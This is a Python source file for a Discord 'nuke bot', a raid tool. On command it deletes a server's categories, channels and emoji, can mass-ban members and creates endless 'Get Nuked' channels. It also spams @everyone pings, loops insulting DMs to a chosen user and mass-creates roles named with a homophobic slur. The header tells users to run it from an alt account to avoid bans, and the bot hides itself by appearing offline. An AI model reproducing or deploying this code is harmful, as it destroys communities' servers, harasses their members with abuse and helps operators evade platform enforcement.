"""
Project Name: Discord Nuke Bot
Created by: 『Nguyên』#1092 (690765019226570843)
Required modules: discord.py, json, os
A few portion of the code is from chivas🚬#9292 (862443325999153182), Someone1611#8712 (699162995871449129)
and from Stack Overflow
------------------------------------------------------------------
How to use:
Run the code to create the "config.json" file. If you encounter an error
(something like, Invalid token passed), open the "config.json" file and paste
your token into the "token" part

Optional: You can enable/disable bot functions simply by modifying the .json file
------------------------------------------------------------------
Functions:
 - Mass Emoji delete
 - Category delete
 - Mass ping
 - Mass channel delete/create
 - Spam DM
 - Mass role create
 - Mass ban (Default set to no. Modify the "config.json" file to enable it)
------------------------------------------------------------------
Permissions:
 - Manage server
 - Manage roles
 - Manage channels
 - Kick member (optional)
 - Ban member (optional)
 - Manage Emojis and Stickers
 - Moderate members
 - Send messages
 - Manage messages
 - Mention everyone
 - Note: If you can give the bot "Administrator" perms then you
don't have to give it perms listed above
------------------------------------------------------------------
WARNING: USE THIS CODE AT YOUR OWN RISK. NUKING A SERVER IS
AGAINST DISCORD TOS, SO YOUR ACCOUNT CAN BE BANNED BECAUSE OF
NUKING A SERVER. IF YOU STILL WANT TO NUKE, REMEMBER TO USE AN ALT.

"""

import discord
from discord.ext import commands
import json
import os

# Variable set ==========

prefix = "lol." # Prefix
i=0
json_data = {
  "token": "Your bot token here",
  "mass_del_category": "yes",
  "mass_del_channel": "yes",
  "mass_ban": "no",
  "mass_delete_emoji": "yes",
  "spam_dm": "yes",
  "mass_create_role": "yes",
  "mass_channel_create": "yes",
  "allowed_user": [690765019226570843]
}


#working with json file
if os.path.isfile('config.json'):
    with open("config.json", "r") as f:
        file_data=f.read()
    json_data=json.loads(file_data)
else:
    with open('config.json', 'w', encoding='utf-8') as f:
      json.dump(json_data, f, ensure_ascii=False, indent=4)
#declaring variables from json file
token = json_data["token"]
mass_del_category = json_data["mass_del_category"]
mass_del_channel = json_data["mass_del_channel"]
mass_ban = json_data["mass_ban"]
mass_delete_emoji = json_data["mass_delete_emoji"]
spam_dm = json_data["spam_dm"]
mass_create_role = json_data["mass_create_role"]
mass_channel_create = json_data["mass_channel_create"]
userid = json_data["allowed_user"]

# =======================
bot = commands.Bot(command_prefix=prefix)
bot.remove_command("help") # Remove the help command

@bot.command(aliases=['nuke', 'raid', 'lol', 'hi'])
async def nukefunc(ctx):
    # Code safeguard. Only included user to run this command
    if ctx.author.id in userid:

        #Globaling variables
        global guild
        global roles
        global i

        # Proceed command

        i = 1
        guild = bot.get_guild(ctx.guild.id)

        if mass_del_category == 'yes':
          for category in guild.categories:
            try:
              await category.delete()
            except:
              pass
        else:
          pass
      
        if mass_del_channel == 'yes':
          for channel in guild.channels:
              try:
                  await channel.delete()
                  
              except:       
                pass
        else:
          pass

        if mass_ban == 'yes':
          for members in guild.members:
              try:
                await members.ban(reason="lol get nuked")
              except:
                pass   
        else:
          pass

        if mass_delete_emoji == 'yes':
          for emoji in guild.emojis:
              try:
                await emoji.delete()
              except:
                pass
        else:
          pass
        
        if mass_channel_create == 'yes':
          try:
              await ctx.guild.edit(name="Get nuked") #change name
          except: 
              pass
          a = 1  
          while a > 0:
            channel = await guild.create_text_channel('Get Nuked')           
            a += 1
        else:
          pass
    else:
      await ctx.send("You can't run this command :thinking:")

@bot.command()
async def dm(ctx, user: discord.Member):
  if ctx.author.id in userid:
    if spam_dm == 'yes':
      a = 1
      while a<2:
        try:
          await user.send("You are an idiot")
        except:
          print("Can't DM that user")
    else:
      pass
  else:
    pass
    

#mass create role
@bot.command()
async def createrole(ctx, number = None):
  if ctx.author.id in userid:
    if mass_create_role == 'yes':
      if not number:
        await ctx.send("Specify how many roles to create idiot")
      else:
        try:
          for x in range(int(number)):
            try:
              global rolename
              rolename = await guild.create_role(name="Gay")
            except: pass
        except:
          print("Something went wrong!")  
               
    else:
      pass
  else:
    pass

@bot.event 
async def spam_ping(channel):
  if i == 1:
    if mass_channel_create == 'yes':
      msg = "@everyone"
      msg2="@here"
      a = 1
      while a < 10:
        await channel.send(msg)
        await channel.send(msg2)
  else:
    pass


@bot.event
async def on_ready():
    print(f"Bot name: {bot.user.name}")
    print(f"Bot ID: {bot.user.id}")
    print(f"Connect to bot successfully") # Verify the bot
    await bot.change_presence(
         status=discord.Status.invisible) #increase bot concealment

bot.run(token) # Run the bot
